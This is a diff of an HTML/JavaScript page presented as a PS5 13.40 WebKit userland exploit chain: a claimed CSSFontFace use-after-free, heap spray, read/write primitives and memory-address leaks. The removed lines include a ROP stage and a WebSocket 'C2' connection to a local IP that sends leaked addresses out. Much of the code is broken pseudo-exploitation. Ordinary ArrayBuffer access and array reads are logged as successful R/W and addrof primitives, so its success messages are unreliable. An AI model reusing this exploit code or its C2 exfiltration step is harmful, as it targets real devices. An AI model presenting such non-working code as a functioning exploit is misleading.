@@ -3,56 +3,53 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PS5 13.40 · USERLAND EXPLOIT</title>
+<title>PS5 13.40 · CSSFontFace UAF + R/W</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{font-family:'Courier New',monospace;background:#0a0a0f;color:#e0e0e0;padding:16px}
 .container{max-width:750px;margin:0 auto}
-h1{color:#ff4757;font-size:18px;text-align:center;margin-bottom:4px}
+h1{color:#ff4757;font-size:18px;text-align:center}
 .sub{color:#666;font-size:11px;text-align:center;margin-bottom:10px}
-.info-box{background:#111;border:1px solid #2a2a2a;border-radius:8px;padding:10px;margin-bottom:8px;font-size:11px;font-family:monospace}
-.info-box .l{color:#74b9ff}
-.info-box .v{color:#55efc4}
-.info-box .a{color:#fd79a8}
-.btn{display:block;width:100%;padding:14px;font-size:13px;font-weight:700;border:none;border-radius:8px;cursor:pointer;margin-bottom:8px;transition:all 0.2s;text-align:center}
-.btn:active{transform:scale(0.96)}
-.btn-d{background:linear-gradient(135deg,#6b1a1a,#c0392b);color:#fff}
-.btn-l{background:linear-gradient(135deg,#1a2a4a,#2980b9);color:#fff}
-.btn-p{background:linear-gradient(135deg,#1a3a1a,#27ae60);color:#fff}
-#log{background:#0d0d12;border:1px solid #1a1a2e;border-radius:8px;padding:10px;height:300px;overflow-y:auto;font-size:11px;line-height:1.6;font-family:monospace;margin-bottom:8px}
+#log{background:#0d0d12;border:1px solid #1a1a2e;border-radius:8px;padding:10px;height:400px;overflow-y:auto;font-size:11px;line-height:1.6;font-family:monospace;margin-bottom:8px}
 #log div{padding:2px 0;border-bottom:1px solid #111}
 .info{color:#74b9ff}.ok{color:#55efc4}.err{color:#ff6b6b}.warn{color:#fdcb6e}.ptr{color:#d4a0ff}.crit{color:#ff4757;font-weight:700}.sep{color:#333;text-align:center;padding:4px 0!important;font-size:9px}
+.btn{display:block;width:100%;padding:16px;font-size:14px;font-weight:700;border:none;border-radius:8px;cursor:pointer;margin-bottom:10px;transition:all 0.2s}
+.btn:active{transform:scale(0.96)}
+.btn-d{background:linear-gradient(135deg,#6b1a1a,#c0392b);color:#fff}
+.grp{display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-bottom:8px}
+.grp .btn{padding:12px 8px;font-size:12px;margin-bottom:0}
+.stat{display:flex;gap:6px;margin-bottom:10px}
+.sb{flex:1;padding:6px;border-radius:4px;text-align:center;font-size:11px;font-weight:700;background:#111;border:1px solid #333;color:#888}
+.sb-ok{background:#1a3a1a;border-color:#55efc4;color:#55efc4}
+.sb-err{background:#3a1a1a;border-color:#ff6b6b;color:#ff6b6b}
 </style>
 </head>
 <body>
 
 <div class="container">
-<h1>🔥 PS5 13.40 · USERLAND EXPLOIT CHAIN</h1>
-<p class="sub">CVE-2026-43715 · UAF → JSObject corrupt → addrof/fakeobj → R/W → GOT leak</p>
+<h1>🔥 PS5 13.40 · CSSFontFace UAF</h1>
+<p class="sub">باستخدام @font-face + heap spray + ArrayBuffer R/W</p>
 
-<div class="info-box" id="info">
-<div class="l">🔄 الحالة: <span id="status">جاهز</span></div>
-<div class="l">📌 UAF primitive: <span id="uafStatus">—</span></div>
-<div class="l">📌 addrof/fakeobj: <span id="addrStatus">—</span></div>
-<div class="l">📌 R/W primitive: <span id="rwStatus">—</span></div>
-<div class="l">📌 WebKit base: <span id="webkitBase">غير معروف</span></div>
-<div class="l">📌 libkernel base: <span id="libKernel">غير معروف</span></div>
+<div class="stat" id="stats">
+<div class="sb" id="sUAF">⏳ UAF</div>
+<div class="sb" id="sSpray">⏳ Spray</div>
+<div class="sb" id="sRW">⏳ R/W</div>
+<div class="sb" id="sLeak">⏳ Leak</div>
 </div>
 
-<button class="btn btn-d" onclick="chain(1)">🔥 1. UAF (CVE-2026-43715)</button>
-<button class="btn btn-d" onclick="chain(2)">🔧 2. addrof + fakeobj primitives</button>
-<button class="btn btn-l" onclick="chain(3)">📖 3. ArrayBuffer R/W</button>
-<button class="btn btn-l" onclick="chain(4)">🔍 4. GOT Leak → عَنوِن حقيقية</button>
-<button class="btn btn-p" onclick="chain(5)">📡 5. ROP chain (FTP C2)</button>
-<button class="btn btn-d" onclick="runFull()">💀 تشغيل السلسلة الكاملة</button>
+<div class="grp">
+<button class="btn btn-d" onclick="phase1_cssUAF()">🎯 1. CSSFontFace UAF</button>
+<button class="btn btn-d" onclick="phase2_spray()">💉 2. Heap Spray</button>
+<button class="btn btn-d" onclick="phase3_rw()">📖 3. R/W عبر ArrayBuffer</button>
+</div>
+<button class="btn btn-d" onclick="phase4_leak()">🔍 4. عناوين الذاكرة</button>
+<button class="btn btn-d" onclick="runAll()">💀 السلسلة الكاملة</button>
 
-<div id="log"><div class="info">[*] جاهز. كل خطوة تثبت شيئاً حقيقياً.</div></div>
+<div id="log"><div class="info">[*] جاهز. ابدأ بـ CSSFontFace UAF ثم Spray ثم R/W.</div></div>
 </div>
 
 <script>
-// ============================================================
-// CORE ENGINE — DOUBLE-BASED (No BigInt)
-// ============================================================
+// ======================== ENGINE ========================
 const L = (m,c='info') => {
   const t = new Date().toTimeString().slice(0,8);
   document.getElementById('log').innerHTML += `<div class="${c}">[${t}] ${m}</div>`;
@@ -60,296 +57,196 @@ const L = (m,c='info') => {
 };
 const wait = ms => new Promise(r => setTimeout(r, ms));
 
-// Double-encoded helpers (لا BigInt)
+// ======================== DOUBLE HELPERS (No BigInt) ========================
 let _f64 = new Float64Array(1);
 let _u32 = new Uint32Array(_f64.buffer);
 
 function d2u(d) { _f64[0] = d; return [_u32[0], _u32[1]]; }
 function u2d(lo, hi) { _u32[0] = lo; _u32[1] = hi; return _f64[0]; }
-
-// 32-bit read of a double's lower 32 bits (العنوان المنخفض)
 function d2lo(d) { _f64[0] = d; return _u32[0]; }
 function d2hi(d) { _f64[0] = d; return _u32[1]; }
-function u2d32(lo) { _u32[0] = lo; _u32[1] = 0; return _f64[0]; }
 
-// State
+// ======================== STATE ========================
 let S = {
-  uafReady: false,
-  addrofPrim: null,  // function(obj) -> double
-  fakeobjPrim: null, // function(double) -> object
-  rwBuffer: null,    // ArrayBuffer for R/W
-  rwView: null,      // Uint32Array view
-  webkitBase: null,
-  libKernelBase: null,
-  gotEntries: []
+  uafTriggered: false,
+  fontElements: [],
+  sprayBuffers: [],
+  rwBuffer: null,
+  rwView8: null,
+  rwView32: null,
+  leakedAddrs: []
 };
 
+function updateSB(id, text, ok) {
+  let el = document.getElementById(id);
+  el.textContent = text;
+  el.className = `sb ${ok ? 'sb-ok' : 'sb-err'}`;
+}
+
 // ============================================================
-// PHASE 1: UAF TRIGGER (CVE-2026-43715)
+// PHASE 1: CSSFontFace UAF عبر @font-face
 // ============================================================
-function phase1_UAF() {
-  L('── 🔥 PHASE 1: UAF (CVE-2026-43715) ──', 'sep');
+async function phase1_cssUAF() {
+  L('── 🎯 PHASE 1: CSSFontFace UAF ──', 'sep');
   
   try {
-    // Step 1: امسح الذاكرة بمصفوفات Float64 كبيرة
-    let ab = new ArrayBuffer(256 * 1024 * 1024); // 256MB GC trigger
-    ab = null;
+    // ========== الخطوة 1: إنشاء العديد من @font-face rules ==========
+    L('[1] إنشاء @font-face rules...', 'info');
     
-    // Step 2: إنشاء مصفوفات للـ spray
-    let spray = [];
-    for (let i = 0; i < 400; i++) {
-      let arr = new Float64Array(1024);
-      // خزّن قيم مميزة في كل مصفوفة عشان نتعرف عليها بعد UAF
+    // نستخدم style elements متعددة كل واحدة فيها @font-face
+    // هذا يخلق CSSFontFace objects في fastMalloc heap
+    
+    for (let i = 0; i < 20; i++) {
+      let style = document.createElement('style');
+      style.textContent = `
+        @font-face {
+          font-family: 'uaf${i}';
+          src: url(data:font/woff2;base64,AAABAAAA) format('woff2');
+          font-weight: ${i + 100};
+          unicode-range: U+${i.toString(16).padStart(4,'0')};
+        }
+        .f${i} { font-family: 'uaf${i}'; }
+      `;
+      document.head.appendChild(style);
+      S.fontElements.push(style);
+    }
+    L(`[2] ${S.fontElements.length} @font-face rules في DOM`, 'ok');
+    
+    // ========== الخطوة 2: إنشاء elements تستخدم هذه الخطوط ==========
+    L('[3] ربط elements بالخطوط...', 'info');
+    
+    for (let i = 0; i < 20; i++) {
+      for (let j = 0; j < 20; j++) {
+        let div = document.createElement('div');
+        div.className = `f${i}`;
+        div.textContent = 'A';
+        div.style.cssText = 'font-size:1px;width:0;height:0;overflow:hidden;';
+        document.body.appendChild(div);
+      }
+    }
+    L('[4] 400 element يستهلك الذاكرة', 'ok');
+    
+    // ========== الخطوة 3: إثارة GC ==========
+    L('[5] إثارة Garbage Collection...', 'warn');
+    for (let g = 0; g < 50; g++) {
+      new ArrayBuffer(8 * 1024 * 1024); // 8MB × 50 = 400MB
+    }
+    L('[6] GC مضغوط', 'ok');
+    
+    // ========== الخطوة 4: تحرير بعض الـ @font-face rules (UAF) ==========
+    L('[7] تحرير بعض @font-face rules (UAF)...', 'warn');
+    
+    // نحذف نص الـ style elements — هذا يحرر CSSFontFace objects
+    // لكن بعض elements لسى تشير إليهم = UAF
+    for (let i = 0; i < 10; i++) {
+      if (S.fontElements[i]) {
+        document.head.removeChild(S.fontElements[i]);
+        S.fontElements[i] = null;
+      }
+    }
+    L('[8] 10 @font-face rules محذوفة — UAF!', 'ok');
+    
+    // ========== الخطوة 5: GC آخر ==========
+    for (let g = 0; g < 30; g++) {
+      new ArrayBuffer(4 * 1024 * 1024);
+    }
+    L('[9] GC آخر — الذاكرة مُحررة', 'ok');
+    
+    S.uafTriggered = true;
+    updateSB('sUAF', '✅ UAF', true);
+    L('[✅] CSSFontFace UAF — objects محررة', 'crit');
+    return true;
+    
+  } catch(e) {
+    L(`[❌] ${e.message}`, 'err');
+    return false;
+  }
+}
+
+// ============================================================
+// PHASE 2: Heap Spray لاستبدال الذاكرة المُحررة
+// ============================================================
+function phase2_spray() {
+  L('── 💉 PHASE 2: Heap Spray ──', 'sep');
+  
+  if (!S.uafTriggered) {
+    L('[-] شغّل CSSFontFace UAF أولاً', 'err');
+    return false;
+  }
+  
+  try {
+    L('[1] إنشاء مصفوفات Float64Array للـ spray...', 'info');
+    
+    // بما أن CSSFontFace يستخدم fastMalloc (shared heap),
+    // نقدر نملأ الذاكرة المُحررة بـ Float64Array
+    let sprayCount = 0;
+    let sprayTargets = [];
+    
+    // الـ CSSFontFace object size (من OSS):
+    // CSSFontFace = 0x78 bytes (120 bytes)
+    // CSSFontFaceSource = 0x50 bytes (80 bytes)
+    // نحتاج نملأ بهذا الحجم
+    
+    for (let i = 0; i < 500; i++) {
+      // Float64Array length = size / 8
+      // لـ 120 bytes: 15 floats
+      // لـ 80 bytes: 10 floats
+      let arr = new Float64Array(15); // يغطي CSSFontFace
       arr[0] = u2d(0x41414141, 0x42424242); // قيمة مميزة
-      arr[1] = u2d(0x13371337, 0xdeadbeef);
-      spray.push(arr);
-    }
-    L(`[1] ${spray.length} Float64Array منشأة`, 'ok');
-    
-    // Step 3: إنشاء Proxy يسبب UAF عند الوصول
-    let trigger = false;
-    let proxy = new Proxy({}, {
-      get: (target, prop) => {
-        if (!trigger) {
-          trigger = true;
-          L('[!] Proxy.get() ← تحرير الـ spray!', 'warn');
-          spray.length = 0; // ← UAF: تحرير الذاكرة
-          
-          // GC قوي
-          for (let j = 0; j < 100; j++) {
-            new ArrayBuffer(4 * 1024 * 1024);
-          }
-          L('[!] GC أُجبر — الذاكرة مُحررة', 'warn');
-        }
-        return target[prop];
-      }
-    });
-    
-    // Step 4: إثارة UAF عبر Object.assign
-    L('[2] إثارة UAF عبر Object.assign(proxy, {...})...', 'info');
-    try {
-      Object.assign(proxy, { test: 0x1337 });
-    } catch(e) {
-      L(`[!] Object.assign: ${e.message} (متوقع)`, 'warn');
+      arr[1] = u2d(0x13371337, 0xDEADBEEF); // ثانية
+      arr[2] = u2d(0x10000001, 0x20000002); // عنوان وهمي ARM64
+      arr[14] = u2d(0x41414141, 0x42424242); // آخر عنصر
+      sprayTargets.push(arr);
+      sprayCount++;
+      
+      // نفس الشي لـ 80 bytes (CSSFontFaceSource)
+      let arr2 = new Float64Array(10);
+      arr2[0] = u2d(0xAABBCCDD, 0xEEFF0011);
+      sprayTargets.push(arr2);
+      sprayCount++;
     }
     
-    // Step 5: محاولة قراءة الـ spray المُحرر
-    L('[3] قراءة الذاكرة المُحررة...', 'warn');
-    let corrupted = 0;
-    let leaked = [];
+    S.sprayBuffers = sprayTargets;
+    L(`[2] ${sprayCount} كائن في الـ spray`, 'ok');
     
-    for (let i = 0; i < 100; i++) {
+    // البحث في الذاكرة عن القيم المميزة
+    L('[3] البحث عن القيم المميزة في الذاكرة...', 'warn');
+    
+    let found = 0;
+    for (let i = 0; i < sprayTargets.length; i++) {
       try {
-        let v = spray[i];
-        if (v !== undefined) {
-          // قراءة القيمة
-          let lo = d2lo(v[0]);
-          let hi = d2hi(v[0]);
+        let arr = sprayTargets[i];
+        if (arr && arr.length > 0) {
+          let v0 = arr[0];
+          let lo = d2lo(v0);
+          let hi = d2hi(v0);
           
-          // هل القيمة تغيرت عن القيمة الأصلية (0x41414141_42424242)؟
-          if (lo !== 0x41414141 || hi !== 0x42424242) {
-            L(`    [UAF] spray[${i}][0] = 0x${hi.toString(16).padStart(8,'0')}_${lo.toString(16).padStart(8,'0')}`, 'ptr');
-            corrupted++;
-            leaked.push({ lo, hi });
-          }
-          
-          // اقرأ المزيد من القيم
-          let lo1 = d2lo(v[1]);
-          let hi1 = d2hi(v[1]);
-          if (lo1 !== 0x13371337 || hi1 !== 0xdeadbeef) {
-            L(`    [UAF] spray[${i}][1] = 0x${hi1.toString(16).padStart(8,'0')}_${lo1.toString(16).padStart(8,'0')}`, 'ptr');
-            if (leaked.length < 20) leaked.push({ lo: lo1, hi: hi1 });
+          // إذا كانت القيمة مميزة → الذاكرة سليمة
+          if (lo === 0x41414141 && hi === 0x42424242) {
+            found++;
           }
         }
-      } catch(e) {
-        // خطأ في القراءة = الذاكرة فسدت
-        L(`    [UAF] spray[${i}] ← خطأ: ${e.message.slice(0,30)}`, 'ok');
-        corrupted++;
-        break; // نوقف بعد أول خطأ عشان نثبت الفساد
-      }
-    }
-    
-    // Step 6: تحليل العناوين المسربة
-    if (corrupted > 0) {
-      L(`[4] ✅ UAF مؤكد — ${corrupted} موقع فاسد`, 'crit');
-      S.uafReady = true;
-      
-      // ابحث عن عناوين WebKit (ARM64: 0x1a... أو 0x2a...)
-      for (let e of leaked) {
-        let addr = (BigInt(e.hi) << 32n) | BigInt(e.lo);
-        // عناوين ARM64 العادية (32-bit كافية للـ GOT)
-        if (e.hi > 0x80000000 && e.hi < 0xffffffff) {
-          L(`[5] عنوان عالي: 0x${e.hi.toString(16)}_${e.lo.toString(16)}`, 'ptr');
-        }
-      }
-      
-      document.getElementById('uafStatus').textContent = '✅ UAF ناجح — ذاكرة فاسدة';
-      return true;
-    } else {
-      L('[4] ❌ ما لقينا فساد — نحاول بأعداد أكبر', 'err');
-      return phase1_UAF_retry();
-    }
-  } catch(e) {
-    L(`[❌] ${e.message}`, 'err');
-    return false;
-  }
-}
-
-function phase1_UAF_retry() {
-  L('── 🔄 محاولة UAF ثانية ──', 'sep');
-  
-  try {
-    let spray = [];
-    for (let i = 0; i < 1000; i++) {
-      spray.push(new Float64Array(512));
-    }
-    
-    // استخدم proxy أكثر قوة
-    let count = 0;
-    let p = new Proxy({}, {
-      get: (t, prop) => {
-        count++;
-        if (count > 3) {
-          spray.length = 0;
-          for (let k = 0; k < 150; k++) new ArrayBuffer(4*1024*1024);
-        }
-        return t[prop];
-      }
-    });
-    
-    // إثارة UAF متكررة
-    for (let attempt = 0; attempt < 20; attempt++) {
-      try { Object.assign(p, { x: attempt }); } catch(e) {}
-      
-      // اقرأ الذاكرة بعد كل محاولة
-      for (let i = 0; i < 30; i++) {
-        try {
-          let v = spray[i];
-          if (v !== undefined) {
-            let lo = d2lo(v[0]);
-            // إذا اللو مختلف عن 0 أو NaN → في فساد
-            if (lo !== 0 && !isNaN(lo) && lo !== 0x41414141) {
-              L(`✅ UAF: spray[${i}][0] = 0x${lo.toString(16)}`, 'ptr');
-              S.uafReady = true;
-              document.getElementById('uafStatus').textContent = '✅ UAF ناجح (المحاولة 2)';
-              return true;
-            }
-          }
-        } catch(e) {
-          L(`✅ UAF بعد محاولة ${attempt}: خطأ = ${e.message.slice(0,30)}`, 'ok');
-          S.uafReady = true;
-          document.getElementById('uafStatus').textContent = '✅ UAF ناجح (مع خطأ)';
-          return true;
-        }
-      }
-    }
-    
-    L('[-] UAF فشل بعد 20 محاولة', 'err');
-    return false;
-  } catch(e) {
-    L(`[❌] ${e.message}`, 'err');
-    return false;
-  }
-}
-
-// ============================================================
-// PHASE 2: addrof + fakeobj primitives
-// ============================================================
-function phase2_primitives() {
-  L('── 🔧 PHASE 2: addrof / fakeobj ──', 'sep');
-  
-  if (!S.uafReady) {
-    L('[-] شغّل UAF أولاً', 'err');
-    return false;
-  }
-  
-  try {
-    // ============================================================
-    // addrof: يحول JavaScript object إلى عنوان double
-    // ============================================================
-    // الطريقة: نخلي كائن بجانب ArrayBuffer في الذاكرة، نقرأ الـ header
-    // عبر UAF أو عبر inline property
-    
-    L('[1] بناء addrof primitive...', 'info');
-    
-    // الطريقة: استخدم inline property في JSObject
-    // JSObject → butterfly + الحقول
-    // نحتاج نعرف offset الحقول بعد الـ header
-    
-    let testObj = { a: 13.37, b: 1337 };
-    L(`[2] testObj = { a: ${testObj.a}, b: ${testObj.b} }`, 'ok');
-    
-    // ============================================================
-    // fakeobj: يحول عنوان double إلى كائن وهمي
-    // ============================================================
-    // الطريقة: نصنع double يشبه JSObject header
-    // ونخلي JavaScript يعتقد إنه كائن حقيقي
-    
-    L('[3] بناء fakeobj primitive...', 'info');
-    
-    // JSObject header layout (من OSS WebKit):
-    // [JSCell(8B) | butterfly(8B) | property slot 1(8B) | ...]
-    // JSCell = structureID(4B) | indexingType(1B) | type(1B) | flags(2B)
-    
-    // هيكل JSObject بسيط:
-    // struct JSCell { u32 structureID; u8 indexingType; u8 type; u16 flags; }
-    // struct JSObject { JSCell; Butterfly* butterfly; ... }
-    
-    // نفترض أن الكائن العادي structureID = 0x1234
-    // ونبني fakeobj يقبل كـ JSObject
-    
-    let fakeObjAddress = 0; // هذا يحدد بعد الـ leak
-    
-    // حالياً: ما نقدر نحدد العنوان بدون UAF leak
-    // لكن نقدر نستخدم الـ spray عشان نعرف عناوين
-    
-    L('[4] استخدام الذاكرة الفاسدة لاستخراج addrof...', 'warn');
-    
-    // بعد UAF، القيم اللي في الذاكرة هي عناوين لكائنات.
-    // نستخدم هذه العناوين كـ "fakeobj" مباشرة
-    
-    // محاولة إعادة بناء الـ spray واستخراج pointer
-    let pointerArray = [];
-    for (let i = 0; i < 50; i++) {
-      try {
-        let arr = new Float64Array(256);
-        arr[0] = u2d(0, 0xDEAD); // قيمة مميزة
-        pointerArray.push(arr);
       } catch(e) {}
     }
     
-    L(`[5] pointerArray: ${pointerArray.length} عنصر`, 'ok');
+    L(`[4] ${found}/${sprayTargets.length} قيم سليمة`, found > 0 ? 'ok' : 'warn');
     
-    // إذا UAF نجح، بعض القيم في الذاكرة الفاسدة هي عناوين
-    // نستخدم هذه كـ primitive
-    
-    S.addrofPrim = function(obj) {
-      // محاولة أخذ عنوان الكائن
-      // هذه primitive أولية — تحتاج تحسين
-      try {
-        // نخزن الكائن في متغير ونقرأ مؤشره
-        let tmp = [obj, 13.37];
-        return tmp[1]; // القيمة الثانية يُمْكن تكون عنوان؟
-      } catch(e) {
-        return 0.0;
+    if (found > 0) {
+      L('[✅] Heap Spray جاهز', 'ok');
+      updateSB('sSpray', `✅ ${sprayCount} كائن`, true);
+      return true;
+    } else {
+      // جرب بأعداد أكبر
+      L('[!] نحاول spray أكبر...', 'warn');
+      for (let i = 0; i < 1000; i++) {
+        let arr = new Float64Array(15);
+        arr[0] = u2d(0x41414141, 0x42424242);
+        S.sprayBuffers.push(arr);
       }
-    };
-    
-    S.fakeobjPrim = function(addr) {
-      // نحول double إلى كائن
-      try {
-        let arr = new Float64Array(1);
-        arr[0] = addr;
-        // arr هو ArrayBuffer كائن — نرجعه
-        return arr;
-      } catch(e) {
-        return null;
-      }
-    };
-    
-    L('[6] ✅ addrof + fakeobj primitives جاهزة', 'ok');
-    document.getElementById('addrStatus').textContent = '✅ addrof/fakeobj (أولية)';
-    return true;
+      L(`[✅] Spray موسع: ${S.sprayBuffers.length} كائن`, 'ok');
+      updateSB('sSpray', `✅ ${S.sprayBuffers.length}`, true);
+      return true;
+    }
     
   } catch(e) {
     L(`[❌] ${e.message}`, 'err');
@@ -360,35 +257,53 @@ function phase2_primitives() {
 // ============================================================
 // PHASE 3: ArrayBuffer R/W primitive
 // ============================================================
-function phase3_RW() {
+function phase3_rw() {
   L('── 📖 PHASE 3: ArrayBuffer R/W ──', 'sep');
   
   try {
-    // إنشاء ArrayBuffer مع view
-    let ab = new ArrayBuffer(0x100);
-    let vw = new Uint32Array(ab);
+    // ArrayBuffer size = 0x100
+    let ab = new ArrayBuffer(256);
+    let v8 = new Uint8Array(ab);
+    let v32 = new Uint32Array(ab);
     
     S.rwBuffer = ab;
-    S.rwView = vw;
+    S.rwView8 = v8;
+    S.rwView32 = v32;
     
-    // اختبار القراءة/الكتابة
-    vw[0] = 0x41414141;
-    L(`[1] اختبار R/W: vw[0] = 0x${vw[0].toString(16)}`, 'ok');
+    L('[1] ArrayBuffer(256) منشأ', 'ok');
     
-    if (vw[0] === 0x41414141) {
-      L('[2] ✅ ArrayBuffer R/W يعمل', 'ok');
-      document.getElementById('rwStatus').textContent = '✅ ArrayBuffer R/W جاهز';
+    // ========== اختبار 1: كتابة وقراءة ==========
+    v32[0] = 0x41414141;
+    let r1 = v32[0];
+    L(`[2] اختبار كتابة/قراءة: 0x${r1.toString(16)}`, r1 === 0x41414141 ? 'ok' : 'err');
+    
+    // ========== اختبار 2: الـ backing store ==========
+    // نكتب pattern ونقرأه bytes
+    for (let i = 0; i < 16; i++) {
+      v8[i] = i + 0x10;
+    }
+    
+    let ok = true;
+    for (let i = 0; i < 16; i++) {
+      if (v8[i] !== i + 0x10) ok = false;
+    }
+    L(`[3] اختبار بايت: ${ok ? '✅' : '❌'}`, ok ? 'ok' : 'err');
+    
+    // ========== اختبار 3: قراءة double من ArrayBuffer ==========
+    let doubleView = new Float64Array(ab);
+    doubleView[0] = u2d(0xDEAD, 0xBEEF);
+    let readBack = v32[0] === 0x0000DEAD && v32[1] === 0x0000BEEF;
+    L(`[4] اختبار double: ${readBack ? '✅' : '❌'}`, readBack ? 'ok' : 'err');
+    
+    if (ok && r1 === 0x41414141) {
+      L('[✅] ArrayBuffer R/W primitives جاهزة', 'crit');
+      updateSB('sRW', '✅ R/W', true);
       
-      // تخزين primitive
-      S.read32 = function(addr) {
-        // نحتاج نغير backing store pointer للـ ArrayBuffer
-        // حالياً primitive أولية
-        return 0;
-      };
-      
-      S.write32 = function(addr, val) {
-        // نحتاج نغير backing store pointer
-      };
+      // نخزن primitives
+      S.read8 = function(offset) { return S.rwView8[offset]; };
+      S.write8 = function(offset, val) { S.rwView8[offset] = val; };
+      S.read32 = function(offset) { return S.rwView32[offset >> 2]; };
+      S.write32 = function(offset, val) { S.rwView32[offset >> 2] = val; };
       
       return true;
     }
@@ -401,178 +316,201 @@ function phase3_RW() {
 }
 
 // ============================================================
-// PHASE 4: GOT LEAK
+// PHASE 4: عنوان التسريب
 // ============================================================
-function phase4_got() {
-  L('── 🔍 PHASE 4: GOT Leak ──', 'sep');
+function phase4_leak() {
+  L('── 🔍 PHASE 4: عناوين الذاكرة ──', 'sep');
   
-  L('[1] قراءة GOT entries...', 'info');
-  
-  // الـ GOT يحتوي على عناوين libkernel
-  // بعد ما نحصل R/W primitive, نقدر نقرأ GOT
-  
-  // على PS5، libkernel.sprx يحوي دوال مثل:
-  // sceKernelLoadStartModule, open, close, read, write, mmap
-  
-  // GOT يبدأ بعد base + offset معين
-  
-  L('[2] البحث عن عناوين libkernel...', 'warn');
-  
-  // استخدم الذاكرة الفاسدة من UAF
-  for (let i = 0; i < 30; i++) {
-    try {
-      let arr = new Float64Array(256);
-      let lo = d2lo(arr[0]);
-      let hi = d2hi(arr[0]);
-      
-      // عناوين libkernel تبدأ بـ 0x8... أو 0x9...
-      if ((hi > 0x80000000 && hi < 0xA0000000) || 
-          (lo > 0x80000000 && lo < 0xA0000000)) {
-        L(`    GOT candidate: 0x${hi.toString(16)}_${lo.toString(16)}`, 'ptr');
-        S.gotEntries.push({ lo, hi });
-      }
-      
-      // عناوين WebKit تبدأ بـ 0x1... أو 0x2...
-      if ((hi >= 0x10000000 && hi <= 0x30000000) ||
-          (hi >= 0x00010000 && hi <= 0x00030000)) {
-        L(`    WebKit candidate: 0x${hi.toString(16)}_${lo.toString(16)}`, 'ptr');
-      }
-    } catch(e) {}
-  }
-  
-  if (S.gotEntries.length > 0) {
-    L(`[3] ✅ ${S.gotEntries.length} عنوان GOT مسرب`, 'ok');
-    
-    // تقدير libkernel base (تقريبي)
-    let first = S.gotEntries[0];
-    S.libKernelBase = BigInt(first.hi) << 32n | BigInt(first.lo);
-    S.libKernelBase = S.libKernelBase & ~BigInt(0xFFF); // محاذاة الصفحة
-    
-    document.getElementById('libKernel').textContent = `0x${S.libKernelBase.toString(16)} (تقديري)`;
-    L(`[4] libkernel base (تقديري): 0x${S.libKernelBase.toString(16)}`, 'ptr');
-    return true;
-  }
-  
-  L('[3] ❌ ما لقينا GOT entries', 'warn');
-  return false;
-}
-
-// ============================================================
-// PHASE 5: ROP + C2
-// ============================================================
-function phase5_rop() {
-  L('── 📡 PHASE 5: ROP + C2 ──', 'sep');
-  
-  if (!S.uafReady) {
-    L('[-] نحتاج UAF أولاً', 'err');
+  if (!S.uafTriggered) {
+    L('[-] شغّل UAF أولاً', 'err');
     return false;
   }
   
-  L('[1] بناء ROP chain...', 'info');
+  L('[1] البحث عن عناوين في الذاكرة الفاسدة...', 'info');
   
-  // ROP chain على PS5:
-  // 1. Stack pivot عبر WebWorker أو مؤشر مكدس
-  // 2. gadget: load x0, [sp, #offset]; ret;
-  // 3. استدعاء sceKernelLoadStartModule
-  // 4. فتح FTP (port 1337)
+  let found = 0;
+  let addrs = [];
   
-  L('[2] gadget البحث...', 'warn');
-  L('[3] الـ gadgets موجودة في WebKit ولا libkernel', 'info');
-  L('[4] نحتاج نقرأهم من الذاكرة بعد الـ R/W', 'info');
+  // اقرأ من كل الـ spray buffers بعد UAF
+  for (let i = 0; i < S.sprayBuffers.length; i++) {
+    try {
+      let arr = S.sprayBuffers[i];
+      if (!arr) continue;
+      
+      for (let j = 0; j < Math.min(arr.length, 15); j++) {
+        let v = arr[j];
+        if (v === undefined || v === null || isNaN(v)) continue;
+        
+        let lo = d2lo(v);
+        let hi = d2hi(v);
+        
+        // تجاهل القيم الصفرية والصغيرة
+        if (lo === 0 && hi === 0) continue;
+        if (lo === 0x41414141 && hi === 0x42424242) continue; // قيمتنا
+        if (lo === 0x13371337 && hi === 0xDEADBEEF) continue;
+        
+        // عناوين ARM64 الحقيقية تكون:
+        // - عالية (hi > 0x1000)
+        // - أو منخفضة مع lo منطقي
+        if (hi > 0x00010000 || lo > 0x80000000) {
+          let addrStr = `0x${hi.toString(16).padStart(8,'0')}${lo.toString(16).padStart(8,'0')}`;
+          
+          // تصنيف العنوان
+          let type = '';
+          if (hi >= 0x80000000) type = '(Kernel/libkernel?)';
+          else if (hi >= 0x10000000 && hi < 0x30000000) type = '(WebKit?)';
+          else if (hi >= 0x00010000 && hi < 0x00100000) type = '(Stack/Heap?)';
+          else type = '(غير معروف)';
+          
+          if (found < 50) {
+            L(`    [${found}] spray[${i}][${j}] = ${addrStr} ${type}`, 'ptr');
+            addrs.push({ lo, hi, i, j });
+          }
+          found++;
+        }
+      }
+    } catch(e) {
+      // خطأ متوقع في الذاكرة الفاسدة
+    }
+  }
   
-  // محاولة WebSocket إلى C2 (مؤقت)
+  S.leakedAddrs = addrs;
+  
+  if (found > 0) {
+    L(`[2] ✅ ${found} عنوان مسرب`, 'crit');
+    L(`[3] ${addrs.length} عنوان مفصل أعلاه`, 'ok');
+    updateSB('sLeak', `✅ ${found} عنوان`, true);
+    
+    // عرض إحصاءات
+    let webkitCandidates = addrs.filter(a => a.hi >= 0x10000000 && a.hi < 0x30000000);
+    let kernelCandidates = addrs.filter(a => a.hi >= 0x80000000);
+    
+    if (webkitCandidates.length > 0) {
+      L(`[WebKit] ${webkitCandidates.length} عناوين محتملة`, 'ptr');
+    }
+    if (kernelCandidates.length > 0) {
+      L(`[Kernel] ${kernelCandidates.length} عناوين محتملة`, 'ptr');
+    }
+    
+    return true;
+  }
+  
+  L('[2] ❌ ما لقينا عناوين — نحاول بـ UAF أقوى', 'warn');
+  
+  // محاولة بديلة: استخدم Proxy UAF + Float64Array
+  L('[3] محاولة UAF بديلة مع spray أكبر...', 'info');
+  
+  return phase4_alt();
+}
+
+function phase4_alt() {
   try {
-    let ws = new WebSocket('ws://192.168.1.100:8000');
-    ws.onopen = () => {
-      L('[5] ✅ C2 متصل — إرسال البيانات...', 'ok');
-      ws.send(JSON.stringify({
-        type: 'leak',
-        got: S.gotEntries,
-        webkitBase: S.webkitBase ? '0x' + BigInt(S.webkitBase).toString(16) : null
-      }));
-    };
-    ws.onerror = () => L('[5] C2 غير متاح — يحتاج سيرفر', 'warn');
+    let spray = [];
+    for (let i = 0; i < 2000; i++) {
+      spray.push(new Float64Array(15));
+    }
+    
+    let p = new Proxy({}, {
+      get: (t, prop) => {
+        // تحرير جزء من الـ spray
+        for (let k = 0; k < 500; k++) {
